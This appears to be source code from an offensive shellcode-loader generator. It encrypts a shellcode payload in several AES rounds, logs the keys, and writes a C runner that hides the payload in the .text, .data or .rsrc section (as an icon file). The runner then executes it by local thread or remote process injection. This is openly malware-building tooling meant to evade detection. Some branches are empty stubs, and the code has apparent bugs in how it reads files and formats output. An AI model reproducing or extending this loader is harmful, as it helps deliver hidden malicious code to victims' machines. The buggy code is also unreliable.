#include <stdio.h>
#include <iostream>
#include <fstream>
#include <string>
#include "Common.h"
using namespace std;

// Does what it says. Reads shellcode from a specified file.
BOOL ReadShellcode(IN char* sFileName, OUT PVOID* pPayload, OUT SIZE_T* sPayloadSize)
{
	// Get file size
	FILE* fptr = NULL;
	fopen_s(&fptr, sFileName, "r");
	fseek(fptr, 0, SEEK_END);
	SIZE_T sFileSize = ftell(fptr);
	fclose(fptr);

	// Read file
	fptr = NULL;
	fopen_s(&fptr, sFileName, "r");
	char* pReadIn = (char*)malloc(sFileSize);
	fgets(pReadIn, sFileSize, fptr);
	fclose(fptr);

	// Return vals
	*pPayload = pReadIn;
	*sPayloadSize = sFileSize;

	return EXIT_SUCCESS;
}

// Logs keys and IVs for each encryption round
BOOL LogAES(IN BYTE* pKey, IN BYTE* pIV, IN int nRound)
{
	// Keychain file pointer
	FILE* fKeychain = fopen("..\\..\\..\\Output\\keychain.txt", "a");

	// Print pkey in C formatting
	fprintf(fKeychain, "\nBYTE pKey%i[] = { ", nRound);
	for (int j = 0; j < 32; j++) {
		if (j == 31)
		{
			fprintf(fKeychain, "0x%0.2X };", pKey[j]);
		}
		else {
			fprintf(fKeychain, "0x%0.2X, ", pKey[j]);
		}
	}
	// print pIV in C formatting
	fprintf(fKeychain, "\nBYTE pIV%ld[] = { ", nRound);
	for (int j = 0; j < 16; j++) {
		if (j == 15)
		{
			fprintf(fKeychain, "0x%0.2X };", pIV[j]);
		}
		else {
			fprintf(fKeychain, "0x%0.2X, ", pIV[j]);
		}
	}

	fclose(fKeychain);
	return EXIT_SUCCESS;
}

// Writes a payload to rsrc .ico file
BOOL WriteRsrc(IN PVOID pPayload, IN SIZE_T sPayloadSize)
{

	ofstream fRsrc;
	fRsrc.open("..\\..\\..\\MalletRun\\payload.ico", ios::binary | ios::out);
	fRsrc.write((const char*)pPayload, sPayloadSize);
	fRsrc.close();

	return EXIT_SUCCESS;
}

// Writes the runner. Takes in payload and options flags.
BOOL WriteRunner(IN PVOID pPayload, IN SIZE_T sPayloadSize, IN struct UserOptions sMenuOptions)
{
	// Runner file pointer
	FILE* fRunner = fopen("..\\..\\..\\MalletRun\\runner.c", "w");
	// Keychain file pointer
	FILE* fKeychain = fopen("..\\..\\..\\Output\\keychain.txt", "r");

	// Write file header. Depends on delivery method
	WriteHeader((PBYTE)pPayload, sPayloadSize, fRunner, sMenuOptions);

	// Write decryption. Based on algo and round count
	WriteDecryption(fRunner, fKeychain, sMenuOptions);

	// Write execution method
	WriteExecution(fRunner, sMenuOptions);

	fprintf(fRunner, "return EXIT_SUCCESS;\n}");
	fclose(fRunner);

	return EXIT_SUCCESS;
}

// Write header and payload for runner
BOOL WriteHeader(IN PBYTE pPayload, IN SIZE_T sPayloadSize, IN FILE* fRunner, IN struct UserOptions sMenuOptions)
{
	switch (sMenuOptions.cPlacement)
	{
		// .text
	case 1:
	{
		// Import header file
		Copyfile("..\\..\\..\\Assets\\Headers\\staticText.c", fRunner);

		// Write payload and size
		for (int j = 0; j < sPayloadSize; j++) {
			if (j == (sPayloadSize - 1))
			{
				fprintf(fRunner, "0x%0.2X };\n", pPayload[j]);
			}
			else {
				fprintf(fRunner, "0x%0.2X, ", pPayload[j]);
			}
		}
		fprintf(fRunner, "SIZE_T sPayloadSize = %ld;\n\n", sPayloadSize);

		break;
	}
		// .data
	case 2:
	{
		// Import header file
		Copyfile("..\\..\\..\\Assets\\Headers\\staticData_pre.c", fRunner);

		// Write payload and size (const)
		for (int j = 0; j < sPayloadSize; j++) {
			if (j == (sPayloadSize - 1))
			{
				fprintf(fRunner, "0x%0.2X };\n", pPayload[j]);
			}
			else {
				fprintf(fRunner, "0x%0.2X, ", pPayload[j]);
			}
		}
		fprintf(fRunner, "SIZE_T sPayloadSize = %ld;\n\n", sPayloadSize);

		// Finish header
		Copyfile("..\\..\\..\\Assets\\Headers\\staticData_post.c", fRunner);

		break;
	}

		// .rsrc - bit more involved. Need to write payload to .ico and add helper function.
	case 3:
	{
		WriteRsrc(pPayload, sPayloadSize);
		Copyfile("..\\..\\..\\Assets\\Headers\\staticRsrc.c", fRunner);

		break;
	}

		// HTTP stager
	case 4:



		break;
	}

	return EXIT_SUCCESS;
}

// Write execution process for runner
BOOL WriteExecution(IN FILE* fRunner, IN struct UserOptions sMenuOptions)
{
	switch (sMenuOptions.cExecute)
	{
		// Local thread execution
	case 1:
	{
		Copyfile("..\\..\\..\\Assets\\Execution\\localThread.c", fRunner);
		break;
	}
		// Remote process injection
	case 2: 
	{
		Copyfile("..\\..\\..\\Assets\\Execution\\remoteProcess.c", fRunner);
		break;
	}
	}
	return EXIT_SUCCESS;
}


BOOL WriteDecryption(IN FILE* fRunner, IN FILE* fKeychain, IN struct UserOptions sMenuOptions)
{
	// Init IO vars - written in C originally, should update
	SIZE_T sLineSize = 300;
	char* cLine = (char*)malloc(sLineSize);
	fgets(cLine, sLineSize, fKeychain); // skip newline at start
	
	// Resolve algorithm
	switch (sMenuOptions.cAlgorithm)
	{
		// AES-256
	case 1:
	{

		for (int i = 0; i < sMenuOptions.nRounds; i++)
		{
			fgets(cLine, sLineSize, fKeychain); // Get key from keychain
			fprintf(fRunner, cLine); // Print key to runner
			fgets(cLine, sLineSize, fKeychain); // Get IV from keychain
			fprintf(fRunner, cLine); // Print IV to runner
			fprintf(fRunner, "\nstruct AES_ctx ctx%i;\n", i);
			fprintf(fRunner, "AES_init_ctx_iv(&ctx%i, pKey%i, pIV%i);\n\n", i, i, i); // Init key ctx struct. Absolutely disgusting way to do this but it works 
		}
		for (int i = sMenuOptions.nRounds - 1; i > -1; i--)
		{
			fprintf(fRunner, "AES_CBC_decrypt_buffer(&ctx%i, pPayload, sPayloadSize);\n", i); // Decrypt backwards. Goofy ass method
		}
	}

	// RC4
	case 2:
	{
		break;
	}

	// XOR
	case 3:
	{
		break;
	}

	}

	return EXIT_SUCCESS;

}